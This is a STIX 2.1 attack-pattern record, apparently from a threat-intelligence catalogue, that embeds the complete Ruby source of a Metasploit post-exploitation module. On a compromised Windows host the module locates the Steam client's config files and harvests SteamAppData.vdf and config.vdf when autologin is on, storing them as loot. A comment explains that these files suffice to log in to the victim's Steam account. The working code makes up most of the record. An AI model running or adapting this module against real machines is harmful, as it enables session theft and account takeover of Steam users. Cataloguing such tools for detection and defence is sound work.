{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0ba71859-de13-4009-b735-bee800f42ca4",
    "created": "2024-08-14T16:33:11.445398Z",
    "modified": "2024-08-14T16:33:11.445401Z",
    "name": "Windows Gather Steam Client Session Collector.",
    "description": " This module will collect Steam session information from an account set to autologin.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/steam.rb",
            "external_id": "steam.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Steam Client Session Collector.',\n        'Description' => %q{\n          This module will collect Steam session information from an\n          account set to autologin.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Nikolai Rusakov <nikolai.rusakov[at]gmail.com>'],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  # All that is needed to login to another Steam account is config.vdf,\n  # setting the AutoLoginUser to the proper username and RememberPassword\n  # to 1 in SteamAppData.vdf.\n  # Only tested on Win7 x64\n  #\n  # config.vdf , ContentCache element holds a K,V table of what appears\n  # to be UniqueID, Session. This is purely speculation as I have not\n  # reversed it to check. However the key is always unique to the account\n  # and the value changes whenever the account is logged out and then\n  # back in.\n  def run\n    steamappdata = 'SteamAppData.vdf'\n    steamconfig = 'config.vdf'\n    u_rx = /AutoLoginUser\\W*\"(.*)\"/\n\n    # Steam client is only 32 bit so we need to know what arch we are on so that we can use\n    # the correct program files folder.\n    # We will just use an x64 only defined env variable to check.\n    progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')\n    progfilesx86 = progfiles_env['ProgramFiles(X86)']\n    if !progfilesx86.blank? && progfilesx86 !~ (/%ProgramFiles\\(X86\\)%/)\n      progs = progfilesx86 # x64\n    else\n      progs = progfiles_env['ProgramFiles'] # x86\n    end\n    path = \"#{progs}\\\\Steam\\\\config\"\n\n    print_status(\"Checking for Steam configs in #{path}\")\n\n    # Check if all the files are there.\n    if directory?(path) && file?(\"#{path}\\\\#{steamappdata}\") && file?(\"#{path}\\\\#{steamconfig}\")\n      print_status('Located steam config files.')\n      sad = read_file(\"#{path}\\\\#{steamappdata}\")\n      if sad =~ /RememberPassword\\W*\"1\"/\n        print_status(\"RememberPassword is set! Accountname is #{u_rx.match(sad)[1]}\")\n        scd = read_file(\"#{path}\\\\#{steamconfig}\")\n        steam_app_data_path = store_loot('steam.config', 'text/plain', session, sad, filename = steamappdata)\n        print_good(\"The file SteamAppData.vdf has been stored on #{steam_app_data_path}\")\n        steam_config_path = store_loot('steam.config', 'text/plain', session, scd, filename = steamconfig)\n        print_good(\"The file config.vdf has been stored on #{steam_config_path}\")\n        print_status('Steam configs harvested successfully!')\n      else\n        print_error('RememberPassword is not set, exiting.')\n        return\n      end\n    else\n      print_error('Steam configs not found.')\n      return\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}